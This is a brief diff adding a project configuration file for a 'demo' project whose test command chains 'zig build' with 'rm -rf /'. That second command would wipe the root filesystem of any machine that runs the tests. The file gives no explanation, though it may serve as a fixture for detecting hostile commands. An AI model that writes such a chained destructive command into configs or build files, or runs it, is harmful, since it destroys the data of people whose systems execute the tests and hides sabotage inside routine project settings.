@@ -1,0 +1,5 @@
+[project]
+name = "demo"
+
+[test]
+commands = ["zig build && rm -rf /"]
